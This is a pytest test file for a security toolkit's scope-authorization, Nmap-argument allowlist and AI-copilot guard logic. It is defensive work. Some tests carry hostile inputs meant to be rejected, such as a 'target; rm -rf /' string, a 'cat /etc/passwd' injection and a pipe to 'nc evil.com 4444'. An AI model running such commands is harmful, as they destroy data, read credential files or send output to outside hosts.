"""Comprehensive security and reliability regression tests for CyberSecuritySuite.

Covers:
1. Target extraction edge cases (IPv4, IPv6, CIDRs, bracketed IPv6, URLs, wildcards, malformed fail-closed).
2. Fail-closed scope authorization checks and IP network containment/exclusions.
3. Nmap adapter argument allowlist hardening and prohibited injection blocking.
4. AI Copilot fail-closed command generation and scope guard enforcement.
5. AI finding validation status rules (unverified observations vs confirmed vulnerabilities).
6. ProcessRunner default timeout and process termination escalation.
"""

import time
import threading
import pytest
from core.scope import ScopeAuthorizationService, ScopeCheckResult
from modules.network.nmap_adapter import NmapAdapter, NmapScanOptions, ScanProfile
from core.ai_copilot import AICopilotEngine, AIProvider
from terminal.runner import ProcessRunner
from storage.db import Database
from storage.models import (
    TargetScope,
    TargetType,
    ScopeRuleType,
    ValidationStatus,
    FindingSeverity,
    ExecutionStatus,
    Project,
)


@pytest.fixture
def db():
    return Database(":memory:")


# ===========================================================================
# 1. Target Parsing & Scope Extraction Edge Cases
# ===========================================================================

def test_extract_host_or_ip_ipv4_and_ports():
    assert ScopeAuthorizationService._extract_host_or_ip("192.168.1.1") == "192.168.1.1"
    assert ScopeAuthorizationService._extract_host_or_ip("192.168.1.1:8080") == "192.168.1.1"
    assert ScopeAuthorizationService._extract_host_or_ip("http://192.168.1.1:8080/api") == "192.168.1.1"


def test_extract_host_or_ip_ipv4_cidr():
    assert ScopeAuthorizationService._extract_host_or_ip("192.168.1.0/24") == "192.168.1.0/24"
    assert ScopeAuthorizationService._extract_host_or_ip("10.0.0.0/8") == "10.0.0.0/8"


def test_extract_host_or_ip_ipv6_variants():
    assert ScopeAuthorizationService._extract_host_or_ip("2001:db8::1") == "2001:db8::1"
    assert ScopeAuthorizationService._extract_host_or_ip("2001:db8::/32") == "2001:db8::/32"
    assert ScopeAuthorizationService._extract_host_or_ip("[2001:db8::1]") == "2001:db8::1"
    assert ScopeAuthorizationService._extract_host_or_ip("[2001:db8::1]:8443") == "2001:db8::1"
    assert ScopeAuthorizationService._extract_host_or_ip("https://[2001:db8::1]:8443/status") == "2001:db8::1"


def test_extract_host_or_ip_hostnames_and_wildcards():
    assert ScopeAuthorizationService._extract_host_or_ip("targetlab.corp") == "targetlab.corp"
    assert ScopeAuthorizationService._extract_host_or_ip("https://targetlab.corp:443/login") == "targetlab.corp"
    assert ScopeAuthorizationService._extract_host_or_ip("*.targetlab.corp") == "*.targetlab.corp"
    assert ScopeAuthorizationService._extract_host_or_ip("api.internal.targetlab.corp") == "api.internal.targetlab.corp"


def test_extract_host_or_ip_malformed_fail_closed():
    assert ScopeAuthorizationService._extract_host_or_ip("") == ""
    assert ScopeAuthorizationService._extract_host_or_ip("   ") == ""
    assert ScopeAuthorizationService._extract_host_or_ip("invalid..host--") == ""
    assert ScopeAuthorizationService._extract_host_or_ip("target; rm -rf /") == ""
    assert ScopeAuthorizationService._extract_host_or_ip("http://[invalid-ipv6]:80") == ""


# ===========================================================================
# 2. Scope Authorization Fail-Closed & Network Rules
# ===========================================================================

def test_scope_authorization_empty_scopes_fails_closed():
    res = ScopeAuthorizationService.is_target_authorized("192.168.1.50", [])
    assert res.is_allowed is False
    assert "No authorized target scopes defined" in res.reason


def test_scope_authorization_malformed_target_fails_closed():
    scopes = [
        TargetScope(project_id=1, target="192.168.1.0/24", target_type=TargetType.CIDR_RANGE, is_authorized=True)
    ]
    res = ScopeAuthorizationService.is_target_authorized("bad;cmd", scopes)
    assert res.is_allowed is False
    assert "malformed" in res.reason.lower() or "invalid" in res.reason.lower()


def test_scope_authorization_ipv4_subnet_inclusion():
    scopes = [
        TargetScope(project_id=1, target="192.168.1.0/24", target_type=TargetType.CIDR_RANGE, is_authorized=True)
    ]
    # In-subnet IP
    res_in = ScopeAuthorizationService.is_target_authorized("192.168.1.100", scopes)
    assert res_in.is_allowed is True

    # Out-of-subnet IP
    res_out = ScopeAuthorizationService.is_target_authorized("192.168.2.100", scopes)
    assert res_out.is_allowed is False


def test_scope_authorization_explicit_exclusion_overrides():
    scopes = [
        TargetScope(project_id=1, target="192.168.1.0/24", target_type=TargetType.CIDR_RANGE, is_authorized=True, rule_type=ScopeRuleType.ALLOWED),
        TargetScope(project_id=1, target="192.168.1.5", target_type=TargetType.IP_ADDRESS, is_authorized=False, rule_type=ScopeRuleType.EXCLUDED),
    ]
    # Allowed host in subnet
    res_ok = ScopeAuthorizationService.is_target_authorized("192.168.1.10", scopes)
    assert res_ok.is_allowed is True

    # Specifically excluded host
    res_ex = ScopeAuthorizationService.is_target_authorized("192.168.1.5", scopes)
    assert res_ex.is_allowed is False
    assert "excluded" in res_ex.reason.lower()


def test_scope_authorization_wildcard_domain_matching():
    scopes = [
        TargetScope(project_id=1, target="*.target.corp", target_type=TargetType.HOSTNAME, is_authorized=True)
    ]
    assert ScopeAuthorizationService.is_target_authorized("api.target.corp", scopes).is_allowed is True
    assert ScopeAuthorizationService.is_target_authorized("stage.auth.target.corp", scopes).is_allowed is True
    assert ScopeAuthorizationService.is_target_authorized("evil.corp", scopes).is_allowed is False


# ===========================================================================
# 3. Nmap Adapter Hardening (Allowlist vs Blacklist)
# ===========================================================================

def test_nmap_adapter_allowed_flags(db: Database):
    adapter = NmapAdapter(db)
    options = NmapScanOptions(
        target="192.168.1.1",
        profile=ScanProfile.TOP_PORTS,
        extra_args=["-Pn", "--open", "-sV", "-T4"],
    )
    cmd = adapter.build_command(options)
    assert "nmap" in cmd[0]
    assert "192.168.1.1" in cmd
    assert "-Pn" in cmd
    assert "--open" in cmd
    assert "-sV" in cmd
    assert "-T4" in cmd


def test_nmap_adapter_rejects_target_list_flags(db: Database):
    adapter = NmapAdapter(db)
    with pytest.raises(ValueError, match="Prohibited Nmap option"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["-iL", "targets.txt"]))

    with pytest.raises(ValueError, match="Prohibited Nmap option"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["-iR", "100"]))

    with pytest.raises(ValueError, match="Prohibited Nmap option"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["--random-targets"]))


def test_nmap_adapter_rejects_arbitrary_scripts(db: Database):
    adapter = NmapAdapter(db)
    with pytest.raises(ValueError, match="Prohibited Nmap option"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["--script", "exploit"]))

    with pytest.raises(ValueError, match="Prohibited Nmap option"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["--script=all"]))


def test_nmap_adapter_rejects_output_redirection(db: Database):
    adapter = NmapAdapter(db)
    with pytest.raises(ValueError, match="Prohibited Nmap option"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["-oA", "/tmp/pwn"]))

    with pytest.raises(ValueError, match="Prohibited Nmap option"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["--stylesheet", "evil.xsl"]))


def test_nmap_adapter_rejects_shell_injections(db: Database):
    adapter = NmapAdapter(db)
    with pytest.raises(ValueError, match="Prohibited metacharacter"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["-sS; cat /etc/passwd"]))

    with pytest.raises(ValueError, match="Prohibited metacharacter"):
        adapter.build_command(NmapScanOptions(target="192.168.1.1", extra_args=["-sT | nc evil.com 4444"]))


def test_nmap_adapter_execute_scan_blocks_unauthorized_flags(db: Database):
    adapter = NmapAdapter(db)
    project = db.create_project(Project(name="Nmap Exec Scan Security Guard"))
    scopes = [TargetScope(project_id=project.id, target="192.168.1.1", target_type=TargetType.IP_ADDRESS, is_authorized=True)]
    options = NmapScanOptions(target="192.168.1.1", extra_args=["-iL", "/tmp/targets.txt"])
    res = adapter.execute_scan(project.id, options=options, scopes=scopes)
    assert res.is_authorized is False
    assert "Prohibited" in res.scope_reason or "rejected" in res.scope_reason.lower()


# ===========================================================================
# 4. AI Copilot Command Generation & Scope Guard
# ===========================================================================

def test_ai_copilot_command_generation_fail_closed_without_scope():
    copilot = AICopilotEngine(provider=AIProvider.BUILTIN_OFFLINE)
    res = copilot.generate_command("scan ports on 192.168.1.10", scopes=None)
    assert res.is_in_scope is False
    assert "BLOCKED" in res.scope_reason


def test_ai_copilot_command_generation_fail_closed_without_target():
    copilot = AICopilotEngine(provider=AIProvider.BUILTIN_OFFLINE)
    scopes = [TargetScope(project_id=1, target="192.168.1.10", target_type=TargetType.IP_ADDRESS, is_authorized=True)]
    res = copilot.generate_command("scan ports", target=None, scopes=scopes)
    assert res.is_in_scope is False
    assert "BLOCKED" in res.scope_reason


def test_ai_copilot_bandit_sast_scope_guard():
    copilot = AICopilotEngine(provider=AIProvider.BUILTIN_OFFLINE)
    # Without scopes -> blocked
    res_noscope = copilot.generate_command("run bandit security audit", scopes=None)
    assert res_noscope.is_in_scope is False
    assert "BLOCKED" in res_noscope.scope_reason

    # With authorized scopes -> in-scope
    scopes = [TargetScope(project_id=1, target="192.168.1.10", target_type=TargetType.IP_ADDRESS, is_authorized=True)]
    res_withscope = copilot.generate_command("run bandit security audit", scopes=scopes)
    assert res_withscope.is_in_scope is True


# ===========================================================================
# 5. AI Finding Validation Status Rules
# ===========================================================================

def test_ai_finding_nmap_open_ports_are_unverified():
    copilot = AICopilotEngine(provider=AIProvider.BUILTIN_OFFLINE)
    output = "22/tcp open ssh OpenSSH 8.2p1\n80/tcp open http Apache 2.4.41"
    findings = copilot.extract_findings_from_terminal(output, target="192.168.1.50", project_id=1)
    assert len(findings) == 2
    for f in findings:
        assert f.validation_status == ValidationStatus.UNVERIFIED


def test_ai_finding_gobuster_routes_are_unverified():
    copilot = AICopilotEngine(provider=AIProvider.BUILTIN_OFFLINE)
    output = "/admin (Status: 200)\n/.git (Status: 301)"
    findings = copilot.extract_findings_from_terminal(output, target="http://192.168.1.50", project_id=1)
    assert len(findings) == 2
    for f in findings:
        assert f.validation_status == ValidationStatus.UNVERIFIED


def test_ai_finding_waf_detection_is_unverified():
    copilot = AICopilotEngine(provider=AIProvider.BUILTIN_OFFLINE)
    output = "[*] The site http://192.168.1.50 is behind Cloudflare WAF."
    findings = copilot.extract_findings_from_terminal(output, target="http://192.168.1.50", project_id=1)
    assert len(findings) == 1
    assert findings[0].validation_status == ValidationStatus.UNVERIFIED
    assert findings[0].severity == FindingSeverity.INFORMATIONAL


def test_ai_finding_sqlmap_generic_is_unverified_but_proof_is_confirmed():
    copilot = AICopilotEngine(provider=AIProvider.BUILTIN_OFFLINE)

    # Generic output without explicit proof -> UNVERIFIED
    generic_output = "[*] [sqlmap] starting @ 12:00:00 / testing for sql injection on target"
    f_gen = copilot.extract_findings_from_terminal(generic_output, target="http://target.corp", project_id=1)
    assert len(f_gen) == 1
    assert f_gen[0].validation_status == ValidationStatus.UNVERIFIED

    # Explicit confirmation output -> CONFIRMED
    confirmed_output = """
    [sqlmap]
    sqlmap identified the following injection points with a total of 56 HTTP(s) requests:
    Parameter: id (GET)
        Type: boolean-based blind
        Title: AND boolean-based blind - WHERE or HAVING clause
    back-end DBMS is MySQL
    """
    f_conf = copilot.extract_findings_from_terminal(confirmed_output, target="http://target.corp", project_id=1)
    assert len(f_conf) == 1
    assert f_conf[0].validation_status == ValidationStatus.CONFIRMED
    assert f_conf[0].severity == FindingSeverity.CRITICAL


# ===========================================================================
# 6. ProcessRunner Reliability
# ===========================================================================

def test_process_runner_default_timeout():
    runner = ProcessRunner()
    # Ensure default timeout is set to 300.0s
    res = runner.run(["echo", "quick test"])
    assert res.status == ExecutionStatus.COMPLETED
    assert res.exit_code == 0


def test_process_runner_cancel_escalates_to_sigkill():
    runner = ProcessRunner()

    def cancel_worker():
        time.sleep(0.1)
        runner.cancel()

    thread = threading.Thread(target=cancel_worker)
    thread.start()

    res = runner.run(["sleep", "3"])
    thread.join()

    assert res.status == ExecutionStatus.CANCELLED
